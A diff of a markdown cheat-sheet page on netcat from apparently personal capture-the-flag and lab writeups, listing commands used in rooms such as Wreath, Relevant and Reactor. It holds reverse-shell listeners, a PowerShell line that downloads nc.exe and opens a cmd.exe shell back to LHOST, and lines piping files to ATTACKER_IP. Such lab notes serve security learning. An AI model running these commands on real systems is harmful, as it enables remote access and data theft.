@@ -1,36 +1,43 @@
 # netcat (nc)
 
-## Internal Commands
-
-```bash
-nc -lvnp 443
-```
-Used on: **Internal** - received the WordPress and Jenkins reverse shells.
-
-## Wreath Commands
-
-```bash
-rlwrap nc -lvnp 4444
-nc -lvnp 4444 > sam.bak
-```
-Used on: **Wreath** - received relayed shells and copied registry hive backups.
-
 Swiss-army knife for TCP/UDP connections. In these writeups, primarily used as a reverse shell listener on the attacker side and as the stager inside reverse shell payloads.
 
 ## Commands Used
+
+### Listen for reverse shell
+```bash
+nc -lvnp 443
+```
+Used on: **Internal**
+
+### Wrap listener with rlwrap for stable prompt
+```bash
+rlwrap nc -lvnp 4444
+```
+Used on: **Wreath**
+
+### Receive exfiltrated file
+```bash
+nc -lvnp 4444 > sam.bak
+```
+Used on: **Wreath**
+
+
 
 ### Listen for an LDAP callback test
 ```bash
 nc -lvp 389
 ```
-Used on: **Breaching Active Directory** - confirmed the printer could reach the attacker on LDAP before building the rogue LDAP server.
+Used on: **Breaching Active Directory**
+
+confirmed the printer could reach the attacker on LDAP before building the rogue LDAP server.
 ### Start a listener
 ```bash
 nc -lvnp 4444
 ```
 Used on: **Kobold**, **Silentium**, **CCTV**, **DevArea**
 
-- `-l` — listen mode
+`-l` — listen mode
 - `-v` — verbose
 - `-n` — no DNS resolution
 - `-p` — port number
@@ -64,7 +71,9 @@ nc -lvnp 4444
 powershell -c "Invoke-WebRequest http://LHOST/nc.exe -OutFile C:\Windows\Temp\nc.exe"
 C:\Windows\Temp\nc.exe LHOST 4444 -e cmd.exe
 ```
-Used on: **Relevant** — delivered through an IIS-executed `.asp` webshell. Full chain: [smb-write-iis-execution.md](../../exploits/web-rce/smb-write-iis-execution.md).
+Used on: **Relevant**
+
+delivered through an IIS-executed `.asp` webshell. Full chain: [smb-write-iis-execution.md](../../exploits/web-rce/smb-write-iis-execution.md).
 
 
 
@@ -75,13 +84,17 @@ nc -lvnp 4444
 nc -lvpn 4444
 nc -nlvp 4545
 ```
-Used on: **bsidesgtdav**, **bsidesgtthompson**, **coldvvars** - listeners for PHP WebDAV shell, JSP WAR shell, uploaded PHP shell, and the secondary `:!bash` shell.
+Used on: **bsidesgtdav**, **bsidesgtthompson**, **coldvvars**
+
+listeners for PHP WebDAV shell, JSP WAR shell, uploaded PHP shell, and the secondary `:!bash` shell.
 
 ### Connect to a network appliance VTY line
 ```bash
 nc -v $TARGET 2623
 ```
-Used on: **OperationTakeover** - opened the FRRouting VTY console to fingerprint the banner, authenticate, and trigger the `banner motd file` read primitive on reconnect.
+Used on: **OperationTakeover**
+
+opened the FRRouting VTY console to fingerprint the banner, authenticate, and trigger the `banner motd file` read primitive on reconnect.
 
 - `-v` — verbose; shows the connect banner (FRR version string, password prompt)
 - Port `2623` is FRR's default VTY; classic IOS uses `23` (telnet)
@@ -93,7 +106,9 @@ ACTION: login
 USERNAME: admin
 SECRET: abc123
 ```
-Used on: **Aster** - logged into Asterisk Manager Interface after Hydra recovered the AMI secret.
+Used on: **Aster**
+
+logged into Asterisk Manager Interface after Hydra recovered the AMI secret.
 
 ### Transfer files over raw TCP
 ```bash
@@ -103,7 +118,9 @@ nc -lvnp 4444 > uid_checker
 # Sender
 cat /uid_checker | nc ATTACKER_IP 4444
 ```
-Used on: **davesblog** - copied the sudo-allowed `/uid_checker` binary back to Kali for reversing.
+Used on: **davesblog**
+
+copied the sudo-allowed `/uid_checker` binary back to Kali for reversing.
 
 ```bash
 # Sender
@@ -112,11 +129,15 @@ nc ATTACKER_IP 80 < /opt/reactorwatch/reactor.db
 # Receiver
 nc -lvnp 80 > reactor.db
 ```
-Used on: **Reactor** - exfiltrated an SQLite database for offline analysis.
+Used on: **Reactor**
+
+exfiltrated an SQLite database for offline analysis.
 
 ### DevHub reverse-shell listeners
 ```bash
 nc -lvnp 4444
 nc -lvnp 5555
 ```
-Used on: **DevHub** - received the MCPJam Inspector shell and the later JupyterLab terminal shell.
+Used on: **DevHub**
+
+received the MCPJam Inspector shell and the later JupyterLab terminal shell.
